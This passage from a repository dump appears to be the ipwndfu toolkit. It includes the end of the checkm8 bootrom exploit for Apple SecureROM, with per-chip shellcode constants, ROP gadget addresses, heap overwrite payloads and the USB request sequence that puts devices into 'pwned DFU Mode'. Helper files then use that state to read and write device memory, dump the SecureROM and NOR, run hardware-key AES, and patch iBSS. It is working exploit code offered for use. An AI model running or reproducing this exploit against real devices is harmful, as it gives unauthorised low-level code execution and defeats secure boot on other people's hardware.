len(t8004_shellcode) <= PAYLOAD_OFFSET_ARMV7\n    assert len(t8004_handler) <= PAYLOAD_SIZE_ARMV7\n    return t8004_shellcode + '\\0' * (PAYLOAD_OFFSET_ARMV7 - len(t8004_shellcode)) + t8004_handler\n  if cpid == 0x8010:\n    constants_usb_t8010 = [\n               0x1800B0000, # 1 - LOAD_ADDRESS\n        0x6578656365786563, # 2 - EXEC_MAGIC\n        0x646F6E65646F6E65, # 3 - DONE_MAGIC\n        0x6D656D636D656D63, # 4 - MEMC_MAGIC\n        0x6D656D736D656D73, # 5 - MEMS_MAGIC\n               0x10000DC98, # 6 - USB_CORE_DO_IO\n    ]\n    constants_checkm8_t8010 = [\n               0x180088A30, # 1 - gUSBDescriptors\n               0x180083CF8, # 2 - gUSBSerialNumber\n               0x10000D150, # 3 - usb_create_string_descriptor\n               0x1800805DA, # 4 - gUSBSRNMStringDescriptor\n               0x1800AFC00, # 5 - PAYLOAD_DEST\n      PAYLOAD_OFFSET_ARM64, # 6 - PAYLOAD_OFFSET\n        PAYLOAD_SIZE_ARM64, # 7 - PAYLOAD_SIZE\n               0x180088B48, # 8 - PAYLOAD_PTR\n    ]\n    t8010_func_gadget              = 0x10000CC4C\n    t8010_enter_critical_section   = 0x10000A4B8\n    t8010_exit_critical_section    = 0x10000A514\n    t8010_dc_civac                 = 0x10000046C\n    t8010_write_ttbr0              = 0x1000003E4\n    t8010_tlbi                     = 0x100000434\n    t8010_dmb                      = 0x100000478\n    t8010_handle_interface_request = 0x10000DFB8\n    t8010_callbacks = [\n      (t8010_dc_civac, 0x1800B0600),\n      (t8010_dmb, 0),\n      (t8010_enter_critical_section, 0),\n      (t8010_write_ttbr0, 0x1800B0000),\n      (t8010_tlbi, 0),\n      (0x1820B0610, 0),\n      (t8010_write_ttbr0, 0x1800A0000),\n      (t8010_tlbi, 0),\n      (t8010_exit_critical_section, 0),\n      (0x1800B0000, 0),\n    ]\n    t8010_handler = asm_arm64_x7_trampoline(t8010_handle_interface_request) + asm_arm64_branch(0x10, 0x0) + prepare_shellcode('usb_0xA1_2_arm64', constants_usb_t8010)[4:]\n    t8010_shellcode = prepare_shellcode('checkm8_arm64', constants_checkm8_t8010)\n    assert len(t8010_shellcode) <= PAYLOAD_OFFSET_ARM64\n    assert len(t8010_handler) <= PAYLOAD_SIZE_ARM64\n    t8010_shellcode = t8010_shellcode + '\\0' * (PAYLOAD_OFFSET_ARM64 - len(t8010_shellcode)) + t8010_handler\n    assert len(t8010_shellcode) <= 0x400\n    return struct.pack('<1024sQ504x2Q496s32x', t8010_shellcode, 0x1000006A5, 0x60000180000625, 0x1800006A5, prepare_shellcode('t8010_t8011_disable_wxn_arm64')) + usb_rop_callbacks(0x1800B0800, t8010_func_gadget, t8010_callbacks)\n  if cpid == 0x8011:\n    constants_usb_t8011 = [\n               0x1800B0000, # 1 - LOAD_ADDRESS\n        0x6578656365786563, # 2 - EXEC_MAGIC\n        0x646F6E65646F6E65, # 3 - DONE_MAGIC\n        0x6D656D636D656D63, # 4 - MEMC_MAGIC\n        0x6D656D736D656D73, # 5 - MEMS_MAGIC\n               0x10000DD64, # 6 - USB_CORE_DO_IO\n    ]\n    constants_checkm8_t8011 = [\n               0x180088948, # 1 - gUSBDescriptors\n               0x180083D28, # 2 - gUSBSerialNumber\n               0x10000D234, # 3 - usb_create_string_descriptor\n               0x18008062A, # 4 - gUSBSRNMStringDescriptor\n               0x1800AFC00, # 5 - PAYLOAD_DEST\n      PAYLOAD_OFFSET_ARM64, # 6 - PAYLOAD_OFFSET\n        PAYLOAD_SIZE_ARM64, # 7 - PAYLOAD_SIZE\n               0x180088A58, # 8 - PAYLOAD_PTR\n    ]\n    t8011_func_gadget              = 0x10000CCEC\n    t8011_dc_civac                 = 0x10000047C\n    t8011_write_ttbr0              = 0x1000003F4\n    t8011_tlbi                     = 0x100000444\n    t8011_dmb                      = 0x100000488\n    t8011_handle_interface_request = 0x10000E08C\n    t8011_callbacks = [\n      (t8011_dc_civac, 0x1800B0600),\n      (t8011_dc_civac, 0x1800B0000),\n      (t8011_dmb, 0),\n      (t8011_write_ttbr0, 0x1800B0000),\n      (t8011_tlbi, 0),\n      (0x1820B0610, 0),\n      (t8011_write_ttbr0, 0x1800A0000),\n      (t8011_tlbi, 0),\n      (0x1800B0000, 0),\n    ]\n\n    t8011_handler   = asm_arm64_x7_trampoline(t8011_handle_interface_request) + asm_arm64_branch(0x10, 0x0) + prepare_shellcode('usb_0xA1_2_arm64', constants_usb_t8011)[4:]\n    t8011_shellcode = prepare_shellcode('checkm8_arm64', constants_checkm8_t8011)\n    assert len(t8011_shellcode) <= PAYLOAD_OFFSET_ARM64\n    assert len(t8011_handler) <= PAYLOAD_SIZE_ARM64\n    t8011_shellcode = t8011_shellcode + '\\0' * (PAYLOAD_OFFSET_ARM64 - len(t8011_shellcode)) + t8011_handler\n    assert len(t8011_shellcode) <= 0x400\n    return struct.pack('<1024sQ504x2Q496s32x', t8011_shellcode, 0x1000006A5, 0x60000180000625, 0x1800006A5, prepare_shellcode('t8010_t8011_disable_wxn_arm64')) + usb_rop_callbacks(0x1800B0800, t8011_func_gadget, t8011_callbacks)\n  if cpid == 0x8015:\n    constants_usb_t8015 = [\n               0x18001C000, # 1 - LOAD_ADDRESS\n        0x6578656365786563, # 2 - EXEC_MAGIC\n        0x646F6E65646F6E65, # 3 - DONE_MAGIC\n        0x6D656D636D656D63, # 4 - MEMC_MAGIC\n        0x6D656D736D656D73, # 5 - MEMS_MAGIC\n               0x10000B9A8, # 6 - USB_CORE_DO_IO\n    ]\n    constants_checkm8_t8015 = [\n               0x180008528, # 1 - gUSBDescriptors\n               0x180003A78, # 2 - gUSBSerialNumber\n               0x10000AE80, # 3 - usb_create_string_descriptor\n               0x1800008FA, # 4 - gUSBSRNMStringDescriptor\n               0x18001BC00, # 5 - PAYLOAD_DEST\n      PAYLOAD_OFFSET_ARM64, # 6 - PAYLOAD_OFFSET\n        PAYLOAD_SIZE_ARM64, # 7 - PAYLOAD_SIZE\n               0x180008638, # 8 - PAYLOAD_PTR\n    ]\n    t8015_load_write_gadget        = 0x10000945C\n    t8015_write_sctlr_gadget       = 0x1000003EC\n    t8015_func_gadget              = 0x10000A9AC\n    t8015_write_ttbr0              = 0x10000045C\n    t8015_tlbi                     = 0x1000004AC\n    t8015_dc_civac                 = 0x1000004D0\n    t8015_dmb                      = 0x1000004F0\n    t8015_handle_interface_request = 0x10000BCCC\n    t8015_callbacks = [\n      (t8015_dc_civac, 0x18001C800),\n      (t8015_dc_civac, 0x18001C840),\n      (t8015_dc_civac, 0x18001C880),\n      (t8015_dmb, 0),\n      (t8015_write_sctlr_gadget, 0x100D),\n      (t8015_load_write_gadget, 0x18001C000),\n      (t8015_load_write_gadget, 0x18001C010),\n      (t8015_write_ttbr0, 0x180020000),\n      (t8015_tlbi, 0),\n      (t8015_load_write_gadget, 0x18001C020),\n      (t8015_write_ttbr0, 0x18000C000),\n      (t8015_tlbi, 0),\n      (0x18001C800, 0),\n    ]\n    t8015_callback_data = usb_rop_callbacks(0x18001C020, t8015_func_gadget, t8015_callbacks)\n    t8015_handler = asm_arm64_x7_trampoline(t8015_handle_interface_request) + asm_arm64_branch(0x10, 0x0) + prepare_shellcode('usb_0xA1_2_arm64', constants_usb_t8015)[4:]\n    t8015_shellcode = prepare_shellcode('checkm8_arm64', constants_checkm8_t8015)\n    assert len(t8015_shellcode) <= PAYLOAD_OFFSET_ARM64\n    assert len(t8015_handler) <= PAYLOAD_SIZE_ARM64\n    t8015_shellcode = t8015_shellcode + '\\0' * (PAYLOAD_OFFSET_ARM64 - len(t8015_shellcode)) + t8015_handler\n    return struct.pack('<6Q16x448s1536x1024s', 0x180020400-8, 0x1000006A5, 0x180020600-8, 0x180000625, 0x18000C600-8, 0x180000625, t8015_callback_data, t8015_shellcode)\n\ndef all_exploit_configs():\n  t8010_nop_gadget = 0x10000CC6C\n  t8011_nop_gadget = 0x10000CD0C\n  t8015_nop_gadget = 0x10000A9C4\n\n  s5l8947x_overwrite = '\\0' * 0x660 + struct.pack('<20xI4x', 0x34000000)\n  s5l895xx_overwrite = '\\0' * 0x640 + struct.pack('<20xI4x', 0x10000000)\n  t800x_overwrite    = '\\0' * 0x5C0 + struct.pack('<20xI4x', 0x48818000)\n  s5l8960x_overwrite = '\\0' * 0x580 + struct.pack('<32xQ8x', 0x180380000)\n  t8010_overwrite    = '\\0' * 0x580 + struct.pack('<32x2Q16x32x2QI',    t8010_nop_gadget, 0x1800B0800, t8010_nop_gadget, 0x1800B0800, 0xbeefbeef)\n  t8011_overwrite    = '\\0' * 0x500 + struct.pack('<32x2Q16x32x2QI',    t8011_nop_gadget, 0x1800B0800, t8011_nop_gadget, 0x1800B0800, 0xbeefbeef)\n  t8015_overwrite    = '\\0' * 0x500 + struct.pack('<32x2Q16x32x2Q12xI', t8015_nop_gadget, 0x18001C020, t8015_nop_gadget, 0x18001C020, 0xbeefbeef)\n\n  return [\n    DeviceConfig('iBoot-1458.2',          0x8947,  626, s5l8947x_overwrite, None, None), # S5L8947 (DFU loop)     1.97 seconds\n    DeviceConfig('iBoot-1145.3'  ,        0x8950,  659, s5l895xx_overwrite, None, None), # S5L8950 (buttons)      2.30 seconds\n    DeviceConfig('iBoot-1145.3.3',        0x8955,  659, s5l895xx_overwrite, None, None), # S5L8955 (buttons)      2.30 seconds\n    DeviceConfig('iBoot-1704.10',         0x8960, 7936, s5l8960x_overwrite, None, None), # S5L8960 (buttons)     13.97 seconds\n    DeviceConfig('iBoot-2651.0.0.1.31',   0x8002, None,    t800x_overwrite,    5,    1), # T8002 (DFU loop)  NEW: 1.27 seconds\n    DeviceConfig('iBoot-2651.0.0.3.3',    0x8004, None,    t800x_overwrite,    5,    1), # T8004 (buttons)   NEW: 1.06 seconds\n    DeviceConfig('iBoot-2696.0.0.1.33',   0x8010, None,    t8010_overwrite,    5,    1), # T8010 (buttons)   NEW: 0.68 seconds\n    DeviceConfig('iBoot-3135.0.0.2.3',    0x8011, None,    t8011_overwrite,    6,    1), # T8011 (buttons)   NEW: 0.87 seconds\n    DeviceConfig('iBoot-3332.0.0.1.23',   0x8015, None,    t8015_overwrite,    6,    1), # T8015 (DFU loop)  NEW: 0.66 seconds\n  ]\n\ndef exploit_config(serial_number):\n  for config in all_exploit_configs():\n    if 'SRTG:[%s]' % config.version in serial_number:\n      return payload(config.cpid), config\n  for config in all_exploit_configs():\n    if 'CPID:%s' % config.cpid in serial_number:\n      print 'ERROR: CPID is compatible, but serial number string does not match.'\n      print 'Make sure device is in SecureROM DFU Mode and not LLB/iBSS DFU Mode. Exiting.'\n      sys.exit(1)\n  print 'ERROR: This is not a compatible device. Exiting.'\n  sys.exit(1)\n\ndef exploit():\n  print '*** checkm8 exploit by axi0mX ***'\n\n  device = dfu.acquire_device()\n  start = time.time()\n  print 'Found:', device.serial_number\n  if 'PWND:[' in device.serial_number:\n    print 'Device is already in pwned DFU Mode. Not executing exploit.'\n    return\n  payload, config = exploit_config(device.serial_number)\n\n  if config.large_leak is not None:\n    usb_req_stall(device)\n    for i in range(config.large_leak):\n      usb_req_leak(device)\n    usb_req_no_leak(device)\n  else:\n    stall(device)\n    for i in range(config.hole):\n      no_leak(device)\n    usb_req_leak(device)\n    no_leak(device)\n  dfu.usb_reset(device)\n  dfu.release_device(device)\n\n  device = dfu.acquire_device()\n  device.serial_number\n  libusb1_async_ctrl_transfer(device, 0x21, 1, 0, 0, 'A' * 0x800, 0.0001)\n  libusb1_no_error_ctrl_transfer(device, 0x21, 4, 0, 0, 0, 0)\n  dfu.release_device(device)\n\n  time.sleep(0.5)\n\n  device = dfu.acquire_device()\n  usb_req_stall(device)\n  if config.large_leak is not None:\n    usb_req_leak(device)\n  else:\n    for i in range(config.leak):\n      usb_req_leak(device)\n  libusb1_no_error_ctrl_transfer(device, 0, 0, 0, 0, config.overwrite, 100)\n  for i in range(0, len(payload), 0x800):\n    libusb1_no_error_ctrl_transfer(device, 0x21, 1, 0, 0, payload[i:i+0x800], 100)\n  dfu.usb_reset(device)\n  dfu.release_device(device)\n\n  device = dfu.acquire_device()\n  if 'PWND:[checkm8]' not in device.serial_number:\n    print 'ERROR: Exploit failed. Device did not enter pwned DFU Mode.'\n    sys.exit(1)\n  print 'Device is now in pwned DFU Mode.'\n  print '(%0.2f seconds)' % (time.time() - start)\n  dfu.release_device(device)\n"
        },
        {
          "name": "device_platform.py",
          "type": "blob",
          "size": 5.1806640625,
          "content": "class DevicePlatform:\n  def __init__(self, cpid, cprv, scep, arch, srtg, rom_base, rom_size, rom_sha1, sram_base, sram_size, dram_base, nonce_length, sep_nonce_length, demotion_reg):\n    self.cpid             = cpid\n    self.cprv             = cprv\n    self.scep             = scep\n    self.arch             = arch\n    self.srtg             = srtg\n    self.rom_base         = rom_base\n    self.rom_size         = rom_size\n    self.rom_sha1         = rom_sha1\n    self.sram_base        = sram_base\n    self.sram_size        = sram_size\n    self.dram_base        = dram_base\n    self.nonce_length     = nonce_length\n    self.sep_nonce_length = sep_nonce_length\n    self.demotion_reg     = demotion_reg\n    if self.cpid in [0x8940, 0x8947]:\n      self.dfu_image_base      = 0x34000000\n      self.dfu_load_base       = 0x9FF00000\n      self.recovery_image_base = 0x9FF00000\n      self.recovery_load_base  = 0x80000000\n    if self.cpid in [0x8950, 0x8955]:\n      self.dfu_image_base      = 0x10000000\n      self.dfu_load_base       = 0xBFF00000\n      self.recovery_image_base = 0xBFF00000\n      self.recovery_load_base  = 0x80000000\n    if self.cpid == 0x8960:\n      self.dfu_image_base      = 0x180380000\n      self.dfu_load_base       = 0x180000000 # varies (HACK: test purposes)\n      self.recovery_image_base = 0x83D7F7000 # varies\n      self.recovery_load_base  = 0x800000000\n    if self.cpid in [0x8002, 0x8004]:\n      self.dfu_image_base      = 0x48818000\n      self.dfu_load_base       = 0x80000000\n      self.recovery_image_base = 0x48818000\n      self.recovery_load_base  = 0x80000000\n    if self.cpid in [0x8010, 0x8011]:\n      self.dfu_image_base      = 0x1800B0000\n      self.dfu_load_base       = 0x800000000\n      self.recovery_image_base = 0x1800B0000\n      self.recovery_load_base  = 0x800000000\n    if self.cpid in [0x8015]:\n      self.dfu_image_base      = 0x18001C000\n      self.dfu_load_base       = 0x800000000\n      self.recovery_image_base = 0x18001C000\n      self.recovery_load_base  = 0x800000000\n\n  def name(self):\n    if 0x8720 <= self.cpid <= 0x8960:\n      return 's5l%xxsi' % self.cpid\n    elif self.cpid in [0x7002, 0x8000, 0x8001, 0x8003]:\n      return 's%xsi' % self.cpid\n    else:\n      return 't%xsi' % self.cpid\n\nall_platforms = [\n  DevicePlatform(cpid=0x8947, cprv=0x00, scep=0x10, arch='armv7', srtg='iBoot-1458.2',\n    rom_base=0x3F000000, rom_size=0x10000, rom_sha1='d9320ddd4bdb1de79ae0601f20e7db23441ab1a7',\n    sram_base=0x34000000, sram_size=0x40000,\n    dram_base=0x80000000,\n    nonce_length=20, sep_nonce_length=None,\n    demotion_reg=0x3F500000,\n  ),\n  DevicePlatform(cpid=0x8950, cprv=0x20, scep=0x10, arch='armv7s', srtg='iBoot-1145.3',\n    rom_base=0x3F000000, rom_size=0x10000, rom_sha1='50a8dd9863868c971aaf95a96e5152378784e4db',\n    sram_base=0x10000000, sram_size=0x80000,\n    dram_base=0x80000000,\n    nonce_length=20, sep_nonce_length=None,\n    demotion_reg=0x3F500000,\n  ),\n  DevicePlatform(cpid=0x8955, cprv=0x20, scep=0x10, arch='armv7s', srtg='iBoot-1145.3.3',\n    rom_base=0x3F000000, rom_size=0x10000, rom_sha1='3af575cc84e54f951db2a83227737664abdc8f40',\n    sram_base=0x10000000, sram_size=0x80000,\n    dram_base=0x80000000,\n    nonce_length=20, sep_nonce_length=None,\n    demotion_reg=0x3F500000,\n  ),\n  DevicePlatform(cpid=0x8002, cprv=0x10, scep=0x01, arch='armv7k', srtg='iBoot-2651.0.0.1.31',\n    rom_base=0x40000000, rom_size=0x100000, rom_sha1='46c14a17f54ec6079260e9253e813084ab1e634b',\n    sram_base=0x48800000, sram_size=0x120000,\n    dram_base=0x80000000,\n    nonce_length=32, sep_nonce_length=20,\n    demotion_reg=0x481BC000,\n  ),\n  DevicePlatform(cpid=0x8004, cprv=0x10, scep=0x01, arch='armv7k', srtg='iBoot-2651.0.0.3.3',\n    rom_base=0x40000000, rom_size=0x20000, rom_sha1='8afdcd6c147ac63fddadd1b92536d1f80c0b8a21',\n    sram_base=0x48800000, sram_size=0x140000,\n    dram_base=0x80000000,\n    nonce_length=32, sep_nonce_length=20,\n    demotion_reg=0x481BC000,\n  ),\n  DevicePlatform(cpid=0x8960, cprv=0x11, scep=0x01, arch='arm64', srtg='iBoot-1704.10',\n    rom_base=0x100000000, rom_size=0x80000, rom_sha1='2ae035c46e02ca40ae777f89a6637be694558f0a',\n    sram_base=0x180000000, sram_size=0x400000,\n    dram_base=0x800000000,\n    nonce_length=20, sep_nonce_length=20,\n    demotion_reg=0x20E02A000,\n  ),\n  DevicePlatform(cpid=0x8010, cprv=0x11, scep=0x01, arch='arm64', srtg='iBoot-2696.0.0.1.33',\n    rom_base=0x100000000, rom_size=0x20000, rom_sha1='41a488b3c46ff06c1a2376f3405b079fb0f15316',\n    sram_base=0x180000000, sram_size=0x200000,\n    dram_base=0x800000000,\n    nonce_length=32, sep_nonce_length=20,\n    demotion_reg=0x2102BC000,\n  ),\n  DevicePlatform(cpid=0x8011, cprv=0x10, scep=0x01, arch='arm64', srtg='iBoot-3135.0.0.2.3',\n    rom_base=0x100000000, rom_size=0x100000, rom_sha1='2fae20a11860b0e3ce1d8a6df7d3961f610ab70d',\n    sram_base=0x180000000, sram_size=0x200000,\n    dram_base=0x800000000,\n    nonce_length=32, sep_nonce_length=20,\n    demotion_reg=0x2102BC000,\n  ),\n  DevicePlatform(cpid=0x8015, cprv=0x11, scep=0x01, arch='arm64', srtg='iBoot-3332.0.0.1.23',\n    rom_base=0x100000000, rom_size=0x100000, rom_sha1='96fccb1a63de1a2d50ff14555d3898a5af46e9b1',\n    sram_base=0x180000000, sram_size=0x200000,\n    dram_base=0x800000000,\n    nonce_length=32, sep_nonce_length=20,\n    demotion_reg=0x2352BC000,\n  ),\n]\n"
        },
        {
          "name": "dfu.py",
          "type": "blob",
          "size": 2.3349609375,
          "content": "import sys, time\nimport usb # pyusb: use 'pip install pyusb' to install this module\nimport usb.backend.libusb1\nimport libusbfinder\n\nMAX_PACKET_SIZE = 0x800\n\ndef acquire_device(timeout=5.0, match=None, fatal=True):\n  backend = usb.backend.libusb1.get_backend(find_library=lambda x:libusbfinder.libusb1_path())\n  #print 'Acquiring device handle.'\n  # Keep retrying for up to timeout seconds if device is not found.\n  start = time.time()\n  once = False\n  while not once or time.time() - start < timeout:\n      once = True\n      for device in usb.core.find(find_all=True, idVendor=0x5AC, idProduct=0x1227, backend=backend):\n          if match is not None and match not in device.serial_number:\n              continue\n          return device\n      time.sleep(0.001)\n  if fatal:\n      print 'ERROR: No Apple device in DFU Mode 0x1227 detected after %0.2f second timeout. Exiting.' % timeout\n      sys.exit(1)\n  return None\n\ndef release_device(device):\n    #print 'Releasing device handle.'\n    usb.util.dispose_resources(device)\n\ndef reset_counters(device):\n    #print 'Resetting USB counters.'\n    assert device.ctrl_transfer(0x21, 4, 0, 0, 0, 1000) == 0\n\ndef usb_reset(device):\n    #print 'Performing USB port reset.'\n    try:\n        device.reset()\n    except usb.core.USBError:\n        # OK: doesn't happen on Yosemite but happens on El Capitan and Sierra\n        pass\n        #print 'Caught exception during port reset; should still work.'\n\ndef send_data(device, data):\n    #print 'Sending 0x%x of data to device.' % len(data)\n    index = 0\n    while index < len(data):\n        amount = min(len(data) - index, MAX_PACKET_SIZE)\n        assert device.ctrl_transfer(0x21, 1, 0, 0, data[index:index + amount], 5000) == amount\n        index += amount\n\ndef get_data(device, amount):\n    #print 'Getting 0x%x of data from device.' % amount\n    data = str()\n    while amount > 0:\n        part = min(amount, MAX_PACKET_SIZE)\n        ret = device.ctrl_transfer(0xA1, 2, 0, 0, part, 5000)\n        assert len(ret) == part\n        data += ret.tostring()\n        amount -= part\n    return data\n\ndef request_image_validation(device):\n    #print 'Requesting image validation.'\n    assert device.ctrl_transfer(0x21, 1, 0, 0, '', 1000) == 0\n    device.ctrl_transfer(0xA1, 3, 0, 0, 6, 1000)\n    device.ctrl_transfer(0xA1, 3, 0, 0, 6, 1000)\n    device.ctrl_transfer(0xA1, 3, 0, 0, 6, 1000)\n    usb_reset(device)\n"
        },
        {
          "name": "dfuexec.py",
          "type": "blob",
          "size": 11.33203125,
          "content": "import binascii, datetime, hashlib, struct, sys, time\nimport usb # pyusb: use 'pip install pyusb' to install this module\nimport dfu, recovery, image3, image3_24Kpwn, utilities\n\nEXEC_MAGIC = 'exec'[::-1]\nAES_BLOCK_SIZE = 16\nAES_GID_KEY = 0x20000200\nAES_UID_KEY = 0x20000201\nAES_ENCRYPT = 16\nAES_DECRYPT = 17\n\nclass PwnedDeviceConfig:\n    def __init__(self, version, cpid, aes_crypto_cmd, memmove, get_block_device, load_address, rom_address, rom_size, rom_sha256):\n        self.version = version\n        self.cpid = cpid\n        self.aes_crypto_cmd = aes_crypto_cmd\n        self.memmove = memmove\n        self.get_block_device = get_block_device\n        self.load_address = load_address\n        self.rom_address = rom_address\n        self.rom_size = rom_size\n        self.rom_sha256 = rom_sha256\n\nconfigs = [\n    #PwnedDeviceConfig(\n    #    # S5L8720 (old bootrom)\n    #    version='240.4',\n    #    cpid='8720',\n    #    aes_crypto_cmd=0x899,\n    #    memmove=0x795c,\n    #    get_block_device=0x1091,\n    #    load_address=0x22000000,\n    #    rom_address=0x20000000,\n    #    rom_size=0x10000,\n    #    rom_sha256='55f4d8ea2791ba51dd89934168f38f0fb21ce8762ff614c1e742407c0d3ca054'\n    #),\n    #PwnedDeviceConfig(\n    #    # S5L8720 (new bootrom)\n    #    version='240.5.1',\n    #    cpid='8720',\n    #    aes_crypto_cmd=0x899,\n    #    memmove=0x7964,\n    #    get_block_device=0x1091,\n    #    load_address=0x22000000,\n    #    rom_address=0x20000000,\n    #    rom_size=0x10000,\n    #    rom_sha256='f15ae522dc9e645fcf997f6cec978ed3ce1811915e84938c68203fb95d80d300'\n    #),\n    PwnedDeviceConfig(\n        # S5L8920 (old bootrom)\n        version='359.3',\n        cpid='8920',\n        aes_crypto_cmd=0x925,\n        memmove=0x83d4,\n        get_block_device=0x1351,\n        load_address=0x84000000,\n        rom_address=0xbf000000,\n        rom_size=0x10000,\n        rom_sha256='99fd16f919a506c7f0701620e132e18c0e6f4025a57a85807960ca092e5e3587'\n    ),\n    PwnedDeviceConfig(\n        # S5L8920 (new bootrom)\n        version='359.3.2',\n        cpid='8920',\n        aes_crypto_cmd=0x925,\n        memmove=0x83dc,\n        get_block_device=0x1351,\n        load_address=0x84000000,\n        rom_address=0xbf000000,\n        rom_size=0x10000,\n        rom_sha256='0e6feb1144c95b1ee088ecd6c45bfdc2ed17191167555b6ca513d6572e463c86'),\n    PwnedDeviceConfig(\n       # S5L8922\n       version='359.5',\n       cpid='8922',\n       aes_crypto_cmd=0x919,\n       memmove=0x8564,\n       get_block_device=0x1851,\n       load_address=0x84000000,\n       rom_address=0xbf000000,\n       rom_size=0x10000,\n       rom_sha256='07b8a615f00961c5802451b5717c344db287b68c5f6d2331ac6ba7a6acdbac9d'\n    ),\n    PwnedDeviceConfig(\n       # S5L8930\n       version='574.4',\n       cpid='8930',\n       aes_crypto_cmd=0x686d,\n       memmove=0x84dc,\n       get_block_device=0x81d5,\n       load_address=0x84000000,\n       rom_address=0xbf000000,\n       rom_size=0x10000,\n       rom_sha256='4f34652a238a57ae0018b6e66c20a240cdbee8b4cca59a99407d09f83ea8082d'\n    ),\n]\n\nclass PwnedDFUDevice():\n    def __init__(self):\n        device = dfu.acquire_device()\n        self.identifier = device.serial_number\n        dfu.release_device(device)\n\n        if 'PWND:[' not in self.identifier:\n            print 'ERROR: Device is not in pwned DFU Mode. Use -p flag to exploit device and then try again.'\n            sys.exit(1)\n\n        if 'CPID:8720' in self.identifier:\n            print 'ERROR: This feature is not supported on iPod Touch (2nd generation).'\n            sys.exit(1)\n\n        self.config = None\n        for config in configs:\n            if 'SRTG:[iBoot-%s]' % config.version in self.identifier:\n                self.config = config\n                break\n        if self.config is None:\n            print 'ERROR: Device seems to be in pwned DFU Mode, but a matching configuration was not found.'\n            sys.exit(1)\n\n    def ecid_string(self):\n        tokens = self.identifier.split()\n        for token in tokens:\n            if token.startswith('ECID:'):\n                return token[5:]\n        print 'ERROR: ECID is missing from USB serial number string.'\n        sys.exit(1)\n\n    def execute(self, cmd, receiveLength):\n        device = dfu.acquire_device()\n        assert self.identifier == device.serial_number\n\n        dfu.reset_counters(device)\n        dfu.send_data(device, EXEC_MAGIC + cmd)\n        dfu.request_image_validation(device)\n        dfu.release_device(device)\n\n        time.sleep(0.5)\n\n        device = dfu.acquire_device()\n        assert self.identifier == device.serial_number\n\n        requiredLength = 0x8 + receiveLength\n        requiredLength = requiredLength if requiredLength % 0x800 == 0 else requiredLength / 0x800 * 0x800 + 0x800\n        received = dfu.get_data(device, requiredLength)\n        dfu.release_device(device)\n\n        (exec_cleared, retval) = struct.unpack('<2I', received[:8])\n        assert exec_cleared == 0\n        return (retval, received[8:8 + receiveLength])\n\n    def securerom_dump(self):\n        securerom = self.read_memory(self.config.rom_address, self.config.rom_size)\n        if hashlib.sha256(securerom).hexdigest() != self.config.rom_sha256:\n            print 'ERROR: SecureROM was dumped, but the SHA256 hash does not match. Exiting.'\n            sys.exit(1)\n        return securerom\n\n    def aes(self, data, action, key):\n        if len(data) % AES_BLOCK_SIZE != 0:\n            print 'ERROR: Length of data for AES encryption/decryption must be a multiple of %s.' % AES_BLOCK_SIZE\n            sys.exit(1)\n\n        cmd = struct.pack('<8I', self.config.aes_crypto_cmd, action, self.config.load_address + 36, self.config.load_address + 0x8, len(data), key, 0, 0)\n        (retval, received) = self.execute(cmd + data, len(data))\n        return received[:len(data)]\n\n    def aes_hex(self, hexdata, action, key):\n        if len(hexdata) % 32 != 0:\n            print 'ERROR: Length of hex data for AES encryption/decryption must be a multiple of %s.' % (2 * AES_BLOCK_SIZE)\n            sys.exit(1)\n\n        return binascii.hexlify(self.aes(binascii.unhexlify(hexdata), action, key))\n\n    def read_memory(self, address, length):\n        (retval, data) = self.execute(struct.pack('<4I', self.config.memmove, self.config.load_address + 8, address, length), length)\n        return data\n\n    def write_memory(self, address, data):\n        (retval, data) = self.execute(struct.pack('<4I%ss' % len(data), self.config.memmove, address, self.config.load_address + 20, len(data), data), 0)\n        return data\n\n    def nor_dump(self, saveBackup):\n        (bdev, empty) = self.execute(struct.pack('<2I5s', self.config.get_block_device, self.config.load_address + 12, 'nor0\\x00'), 0)\n        if bdev == 0:\n            print 'ERROR: Unable to dump NOR. Pointer to nor0 block device was NULL.'\n            sys.exit(1)\n\n        data = self.read_memory(bdev + 28, 4)\n        (read,) = struct.unpack('<I', data)\n        if read == 0:\n            print 'ERROR: Unable to dump NOR. Function pointer for reading was NULL.'\n            sys.exit(1)\n\n        NOR_PART_SIZE = 0x20000\n        NOR_PARTS = 8\n        nor = str()\n        for i in range(NOR_PARTS):\n            print 'Dumping NOR, part %s/%s.' % (i+1, NOR_PARTS)\n            (retval, received) = self.execute(struct.pack('<6I', read, bdev, self.config.load_address + 8, i * NOR_PART_SIZE, 0, NOR_PART_SIZE), NOR_PART_SIZE)\n            nor += received\n\n        if saveBackup:\n            date = datetime.datetime.now().strftime('%Y%m%d-%H%M%S')\n            filename = 'nor-backups/nor-%s-%s.dump' % (self.ecid_string(), date)\n            f = open(filename, 'wb')\n            f.write(nor)\n            f.close()\n            print 'NOR backed up to file: %s' % filename\n\n        return nor\n\n    def boot_ibss(self):\n        print 'Sending iBSS.'\n        if self.config.cpid != '8920':\n            print 'ERROR: Boot iBSS is currently only supported on iPhone 3GS.'\n            sys.exit(1)\n\n        help1 = 'Download iPhone2,1_4.3.5_8L1_Restore.ipsw and use the following command to extract iBSS:'\n        help2 = 'unzip -p iPhone2,1_4.3.5_8L1_Restore.ipsw Firmware/dfu/iBSS.n88ap.RELEASE.dfu > n88ap-iBSS-4.3.5.img3'\n        try:\n            f = open('n88ap-iBSS-4.3.5.img3', 'rb')\n            data = f.read()\n            f.close()\n        except:\n            print 'ERROR: n88ap-iBSS-4.3.5.img3 is missing.'\n            print help1\n            print help2\n            sys.exit(1)\n        if len(data) == 0:\n            print 'ERROR: n88ap-iBSS-4.3.5.img3 exists, but is empty (size: 0 bytes).'\n            print help1\n            print help2\n            sys.exit(1)\n        if hashlib.sha256(data).hexdigest() != 'b47816105ce97ef02637ec113acdefcdee32336a11e04eda0a6f4fc5e6617e61':\n            print 'ERROR: n88ap-iBSS-4.3.5.img3 exists, but is from the wrong IPSW or corrupted.'\n            print help1\n            print help2\n            sys.exit(1)\n\n        iBSS = image3.Image3(data)\n        decryptediBSS = iBSS.newImage3(decrypted=True)\n        n88ap_iBSS_435_patches = [\n            (0x14954,                     'run\\x00'), # patch 'reset' command string to 'run'\n            (0x17654, struct.pack('<I', 0x41000001)), # patch 'reset' command handler to LOAD_ADDRESS + 1\n        ]\n        patchediBSS = decryptediBSS[:64] + utilities.apply_patches(decryptediBSS[64:], n88ap_iBSS_435_patches)\n\n        device = dfu.acquire_device()\n        assert self.identifier == device.serial_number\n        dfu.reset_counters(device)\n        dfu.request_image_validation(device)\n        dfu.release_device(device)\n\n        time.sleep(0.5)\n\n        device = dfu.acquire_device()\n        assert self.identifier == device.serial_number\n        data = dfu.send_data(device, patchediBSS)\n        dfu.request_image_validation(device)\n        